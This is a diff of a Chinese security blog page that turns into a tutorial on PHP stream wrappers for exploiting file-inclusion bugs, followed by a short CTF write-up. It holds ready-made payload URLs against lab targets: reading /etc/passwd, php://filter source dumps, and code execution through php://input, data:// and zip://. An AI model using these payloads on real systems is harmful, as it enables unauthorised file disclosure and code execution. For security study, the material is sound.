@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="CTF Web,PHP伪协议,PHP,后端,">
 
 
 
@@ -87,16 +87,22 @@
 
 
 
-<meta name="description" content="等级：LV8">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Keven S">
-<meta property="og:url" content="http://keven.ss06.com/archives/index.html">
+<meta name="description" content="文件包含漏洞利用的前提1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；在使用文件包含漏洞时，必须要能知道其绝对路径方法： 在包含文件处，查看其返回的错误的信息 伪协议种类123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网">
+<meta name="keywords" content="CTF Web,PHP伪协议,PHP,后端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP伪协议">
+<meta property="og:url" content="http://keven.ss06.com/2019/10/11/PHP伪协议/index.html">
 <meta property="og:site_name" content="Keven S">
-<meta property="og:description" content="等级：LV8">
+<meta property="og:description" content="文件包含漏洞利用的前提1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；在使用文件包含漏洞时，必须要能知道其绝对路径方法： 在包含文件处，查看其返回的错误的信息 伪协议种类123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://keven.ss06.com/images/wenjianbaohan1.png">
+<meta property="og:image" content="http://keven.ss06.com/images/wenjianbaohan2.png">
+<meta property="og:image" content="http://keven.ss06.com/images/wenjianbaohan3.png">
+<meta property="og:updated_time" content="2019-10-11T12:31:17.342Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Keven S">
-<meta name="twitter:description" content="等级：LV8">
+<meta name="twitter:title" content="PHP伪协议">
+<meta name="twitter:description" content="文件包含漏洞利用的前提1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；在使用文件包含漏洞时，必须要能知道其绝对路径方法： 在包含文件处，查看其返回的错误的信息 伪协议种类123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网">
+<meta name="twitter:image" content="http://keven.ss06.com/images/wenjianbaohan1.png">
 
 
 
@@ -126,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://keven.ss06.com/archives/">
+  <link rel="canonical" href="http://keven.ss06.com/2019/10/11/PHP伪协议/">
 
 
 
 
 
-  <title>归档 | Keven S</title>
+  <title>PHP伪协议 | Keven S</title>
   
 
 
@@ -151,7 +157,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -307,352 +313,251 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://keven.ss06.com/2019/10/11/PHP伪协议/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Keven">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/temp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Keven S">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">PHP伪协议</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-11T20:06:02+08:00">
+                2019-10-11
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-11T20:31:17+08:00">
+                2019-10-11
+              </time>
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 9 篇日志。 继续努力。
-      </span>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
 
-        
+          
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/11/PHP伪协议/" itemprop="url">
-              
-                <span itemprop="name">PHP伪协议</span>
-              
-            </a>
-        
-      </h2>
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-11T20:06:02+08:00" content="2019-10-11">
-          10-11
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/08/基本的栈溢出/" itemprop="url">
-              
-                <span itemprop="name">基本的栈溢出</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-08T21:25:44+08:00" content="2019-10-08">
-          10-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <h2 id="文件包含漏洞利用的前提"><a href="#文件包含漏洞利用的前提" class="headerlink" title="文件包含漏洞利用的前提"></a>文件包含漏洞利用的前提</h2><p>1.web 应用采用 include 等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入；<br>2.用户能够控制包含文件的参数，被包含的文件可被当前页面访问；<br>在使用文件包含漏洞时，必须要能知道其绝对路径<br>方法： 在包含文件处，查看其返回的错误的信息</p>
+<h2 id="伪协议种类"><a href="#伪协议种类" class="headerlink" title="伪协议种类"></a>伪协议种类</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
 
-        
-        
+<p>伪协议后文件必须是绝对路径</p>
+<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>条件：allow_url_fopen: off/on allow_url_include: off/on</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux	：http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd		绝对路径</span><br><span class="line">Windows	：http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=file:///C:\DVWA-master\vulnerabilities\<span class="keyword">fi</span>\1.txt		绝对路径</span><br></pre></td></tr></table></figure>
 
-        
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://伪协议，主要为php://input与php://filter</span><br><span class="line">php://input：将POST输入流当做PHP代码执行。其只allow_url_include参数的影响，allow_url_fopen开关与此伪协议无关。</span><br><span class="line"></span><br><span class="line">php://output 是一个只写的数据流， 允许你以 <span class="built_in">print</span> 和 <span class="built_in">echo</span> 一样的方式 写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">php://filter伪协议：不受   allow_url_fopen与allow_url_include参数的影响</span><br></pre></td></tr></table></figure>
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=php://filter/resource=./1.txt		相对路径</span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=php://filter/resource=file:///C:\DVWA-master\vulnerabilities\<span class="keyword">fi</span>\1.txt		绝对路径</span><br><span class="line">http://127.0.0.1/FI/LFI.php?file=php://filter/resource=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">此协议主要用于读取php源代码时会用到</span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=./1.txt			以base64编码将文件内容输出</span><br></pre></td></tr></table></figure>
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/08/RSA加密算法/" itemprop="url">
-              
-                <span itemprop="name">RSA加密算法</span>
-              
-            </a>
-        
-      </h2>
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>条件：allow_url_fopen: off/on         allow_url_include: off/on<br>    1 、现将要执行 php 代码写好并且命名为 a.txt，将 a.txt 进行 zip 压缩，命名为 a.zip，如果可以上传 zip 文件便直接上传，如若不能可将 a.zip 命名为 a.jpg 上传；<br>    2 、将 a.php 直接压缩成 a.bz2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.zip%23a.txt </span><br><span class="line">http://127.0.0.1/FI/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.jpg%23a.txt</span><br></pre></td></tr></table></figure>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-08T18:47:06+08:00" content="2019-10-08">
-          10-08
-        </time>
-      </div>
+<h2 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h2><p>条件：allow_url_fopen: off/on         allow_url_include: off/on     php 版本大于等于php5.3.0</p>
+<h2 id="data"><a href="#data" class="headerlink" title="data"></a>data</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on 			allow_url_include: on</span><br><span class="line"></span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=data://<span class="built_in">test</span>/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/<span class="keyword">fi</span>/?page=data://<span class="built_in">test</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
 
-    </header>
-  </article>
+<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen:off/on allow_url_include：on</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/LFI.php?file=php://input	</span><br><span class="line">	用post方式提交这个数据 &lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
 
+<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen与allow_url_include同时开启。缺一不可</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?file=http://www.baidu.com</span><br></pre></td></tr></table></figure>
 
+<h2 id="文件包含-百度杯”CTF比赛-2017-二月场include"><a href="#文件包含-百度杯”CTF比赛-2017-二月场include" class="headerlink" title="文件包含 百度杯”CTF比赛 2017 二月场include"></a>文件包含 百度杯”CTF比赛 2017 二月场include</h2><pre><code>&lt;?php 
+show_source(__FILE__);
+if(isset($_REQUEST[&apos;path&apos;])){
+include($_REQUEST[&apos;path&apos;]);
+}else{
+    include(&apos;phpinfo.php&apos;);
+}</code></pre><p>发现已经直接包含了phpinfo()。既然是文件包含错误，首先搜索了一下allow_url_include，发现是处于打开的状态。<br><img src="/images/wenjianbaohan1.png" alt><br>既然 allow_url_include打开，意味着直接能使php://input用包含post中的代码。不多说，直接先查看一下目录下的文件: <img src="/images/wenjianbaohan2.png" alt><br>发现一个可疑文件dle345aae.php，cat一下<br><img src="/images/wenjianbaohan3.png" alt><br>参考链接：<a href="https://blog.csdn.net/Wu000999/article/details/101925271" target="_blank" rel="noopener">https://blog.csdn.net/Wu000999/article/details/101925271</a></p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/08/XCTF-逆向-re1-100/" itemprop="url">
-              
-                <span itemprop="name">XCTF 逆向 re1-100</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-08T16:47:10+08:00" content="2019-10-08">
-          10-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/07/PHP弱类型/" itemprop="url">
-              
-                <span itemprop="name">PHP弱类型</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-07T20:08:51+08:00" content="2019-10-07">
-          10-07
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/06/Hexo-Next主题配置/" itemprop="url">
-              
-                <span itemprop="name">Hexo Next主题配置</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-06T16:49:14+08:00" content="2019-10-06">
-          10-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/06/PHP反序列化漏洞（1）/" itemprop="url">
-              
-                <span itemprop="name">PHP反序列化漏洞（1）</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-06T09:24:51+08:00" content="2019-10-06">
-          10-06
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/04/文件上传漏洞/" itemprop="url">
-              
-                <span itemprop="name">文件上传漏洞</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-04T22:32:44+08:00" content="2019-10-04">
-          10-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/01/第一篇博文/" itemprop="url">
-              
-                <span itemprop="name">第一篇博文</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-01T20:48:51+08:00" content="2019-10-01">
-          10-01
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Keven
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://keven.ss06.com/2019/10/11/PHP伪协议/" title="PHP伪协议">http://keven.ss06.com/2019/10/11/PHP伪协议/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:20px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF Web</a>
+          
+            <a href="/tags/PHP伪协议/" rel="tag"># PHP伪协议</a>
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/后端/" rel="tag"># 后端</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/08/基本的栈溢出/" rel="next" title="基本的栈溢出">
+                <i class="fa fa-chevron-left"></i> 基本的栈溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -660,6 +565,17 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80Njk2Mi8yMzQ2Mw=="></div>
+    </div>
+
+  
+
+
+
+
 
         </div>
         
@@ -680,8 +596,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -817,6 +742,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含漏洞利用的前提"><span class="nav-number">1.</span> <span class="nav-text">文件包含漏洞利用的前提</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪协议种类"><span class="nav-number">2.</span> <span class="nav-text">伪协议种类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file"><span class="nav-number">3.</span> <span class="nav-text">file</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">4.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zip"><span class="nav-number">5.</span> <span class="nav-text">zip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar"><span class="nav-number">6.</span> <span class="nav-text">phar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data"><span class="nav-number">7.</span> <span class="nav-text">data</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-number">8.</span> <span class="nav-text">input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-number">9.</span> <span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含-百度杯”CTF比赛-2017-二月场include"><span class="nav-number">10.</span> <span class="nav-text">文件包含 百度杯”CTF比赛 2017 二月场include</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -989,6 +930,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -1017,6 +962,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
